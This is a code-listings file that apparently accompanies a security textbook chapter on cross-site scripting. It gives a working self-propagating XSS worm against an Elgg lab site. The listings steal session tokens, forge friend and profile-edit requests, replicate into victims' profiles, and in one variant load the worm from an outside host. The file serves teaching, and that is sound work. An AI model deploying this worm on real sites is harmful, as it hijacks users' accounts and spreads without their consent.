@@ -1,0 +1,150 @@
+
+/******************************
+ * Code in Chapter 10 
+ ******************************/
+
+
+/**********************************************
+ * Javascript Code on Page 173 (Section 10.2.2)
+ **********************************************/
+
+<script type="text/javascript">
+...
+elgg.config.lastcache = 1416251895;
+elgg.config.viewtype = 'default';
+elgg.config.simplecache_enabled = 1;
+
+elgg.security.token.__elgg_ts = 1426685430;          
+elgg.security.token.__elgg_token = '8bac...2be';    
+
+elgg.page_owner =  {"guid":39,"type":"user",...};
+elgg.session.user = new elgg.ElggUser({"guid":39, ...,
+                                       "name":"Alice", ...};
+...
+</script>
+
+
+/**********************************************
+ * Listing 10.1: Construct and send an add-friend request
+ **********************************************/
+
+<script id="worm" type="text/javascript">
+// Set the timestamp and secret token parameters 
+var ts    = "&__elgg_ts="+elgg.security.token.__elgg_ts;      
+var token = "&__elgg_token="+elgg.security.token.__elgg_token; 
+
+// Construct the URL (Samy's GUID is 42)
+var sendurl="http://www.xsslabelgg.com/action/friends/add"     
+             + "?friend=42" + token + ts;                      
+
+// Create and send the Ajax request
+var Ajax=new XMLHttpRequest();
+Ajax.open("GET",sendurl,true);
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax.setRequestHeader("Content-Type",
+                      "application/x-www-form-urlencoded");
+Ajax.send();
+</script>
+
+
+
+
+/**********************************************
+ * Listing 10.2: Construct and send an edit-profile request
+ **********************************************/
+
+<script id="worm" type="text/javascript">
+// Access user name and guid
+var name = "&name=" + elgg.session.user.name;
+var guid = "&guid=" + elgg.session.user.guid;
+
+// Access timestamp and security token
+var ts    = "&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token = "&__elgg_token="+elgg.security.token.__elgg_token;
+
+// Set the content and access leve for the description field
+var desc = "&description=SAMY+is+MY+HERO";
+desc += "&accesslevel%5Bdescription%5d=2";
+
+// Set the URL
+var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+
+// Construct and send the Ajax request
+if(elgg.session.user.guid != 42)     (*@\ding{192}@*)
+{
+   //Create and send Ajax request to modify profile
+   var Ajax=new XMLHttpRequest();
+   Ajax.open("POST", sendurl, true);
+   Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+   Ajax.setRequestHeader("Content-Type",
+                         "application/x-www-form-urlencoded");
+
+   // Send the POST request with the data
+   Ajax.send(token + ts + name + desc + guid);
+}
+</script>
+
+
+
+/**********************************************
+ * Listing 10.3: a self-propagating JavaScript program
+ **********************************************/
+
+<script id="worm" type="text/javascript">
+var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  
+var jsCode = document.getElementById("worm").innerHTML;
+var tailTag = "</" + "script>";                                  
+
+// Put all the pieces together, and apply the URI encoding 
+var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);  
+
+// Set the content of the description field and access level.
+var desc = "&description=SAMY+is+MY+HERO" + wormCode;
+desc += "&accesslevel%5Bdescription%5d=2";                       
+
+// Get the name, guid, timestamp, and token.
+var name = "&name=" + elgg.session.user.name;
+var guid = "&guid=" + elgg.session.user.guid;
+var ts    = "&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token = "&__elgg_token="+elgg.security.token.__elgg_token;
+
+// Set the URL
+var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+
+// Construct and send the Ajax request
+if(elgg.session.user.guid != 42)
+{
+   //Create and send Ajax request to modify profile
+   var Ajax=new XMLHttpRequest();
+   Ajax.open("POST", sendurl, true);
+   Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+   Ajax.setRequestHeader("Content-Type",
+                         "application/x-www-form-urlencoded");
+
+   // Send the POST request with the data
+   Ajax.send(token + ts + name + desc + guid);
+}
+</script>
+
+
+
+/**********************************************
+ * Code on Page 180 (Section 10.3.2)
+ **********************************************/
+
+var wormCode =  encodeURIComponent(
+       "<script type=\"text/javascript\" " 
+       + "src=\"http://www.example.com/xssWorm.js\">";
+       + "</" + "script>");
+
+// Set the content for the description field 
+var desc="&description=SAMY+is+MY+HERO" + wormCode;
+desc += "&accesslevel%5Bdescription%5d=2";                     
+
+(the rest of the code is the same as that in the previous approach)
+... 
+
+
+
+
+
